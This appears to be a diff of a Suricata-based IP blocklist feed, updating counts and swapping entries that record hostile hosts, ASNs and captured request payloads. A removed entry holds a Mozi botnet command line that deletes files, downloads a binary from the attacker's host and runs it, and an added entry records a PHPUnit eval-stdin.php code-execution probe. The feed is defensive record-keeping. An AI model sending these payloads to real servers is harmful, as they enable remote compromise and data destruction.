@@ -1,64 +1,13 @@
 {
-  "generated_at": "2026-11-04T01:00:00Z",
+  "generated_at": "2026-11-04T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 41,
-    "v4": 41,
+    "total": 43,
+    "v4": 43,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "153.117.9.89",
-      "family": "v4",
-      "first_seen": "2026-10-28T06:00:00Z",
-      "last_seen": "2026-10-28T06:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "153.117.9.0/24",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://153.117.9.89:33418/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
-      ]
-    },
-    {
-      "ip": "43.135.25.158",
-      "family": "v4",
-      "first_seen": "2026-10-28T02:00:00Z",
-      "last_seen": "2026-10-28T02:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "132203",
-      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
-      "asn_prefix": "43.135.0.0/18",
-      "payloads": [
-        "POST /applyapp.cgi"
-      ]
-    },
-    {
-      "ip": "45.156.87.50",
-      "family": "v4",
-      "first_seen": "2026-10-28T06:00:00Z",
-      "last_seen": "2026-10-28T06:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "197170",
-      "asn_name": "TECHTIES-AS TechTies Inc.",
-      "asn_prefix": "45.156.87.0/24"
-    },
     {
       "ip": "72.255.18.49",
       "family": "v4",
@@ -761,6 +710,99 @@
       "asn_prefix": "167.99.80.0/20",
       "payloads": [
         "GET /"
+      ]
+    },
+    {
+      "ip": "35.206.133.147",
+      "family": "v4",
+      "first_seen": "2026-11-04T06:00:00Z",
+      "last_seen": "2026-11-04T06:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.206.128.0/18",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "85.217.140.20",
+      "family": "v4",
+      "first_seen": "2026-11-04T04:00:00Z",
+      "last_seen": "2026-11-04T04:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "209334",
+      "asn_name": "MODAT-01 Modat B.V.",
+      "asn_prefix": "85.217.140.0/24",
+      "tags": [
+        "mwl:scanner=\"modat\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "194.32.120.41",
+      "family": "v4",
+      "first_seen": "2026-11-04T04:00:00Z",
+      "last_seen": "2026-11-04T04:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP PHPUnit PHP remote code execution attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "199741",
+      "asn_name": "TRANSITX-BYOIP-Customers TransitX Ltd",
+      "asn_prefix": "194.32.120.0/24",
+      "payloads": [
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "20.29.52.146",
+      "family": "v4",
+      "first_seen": "2026-11-04T03:00:00Z",
+      "last_seen": "2026-11-04T03:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.0.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "40.119.45.252",
+      "family": "v4",
+      "first_seen": "2026-11-04T12:00:00Z",
+      "last_seen": "2026-11-04T12:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
       ]
     }
   ]
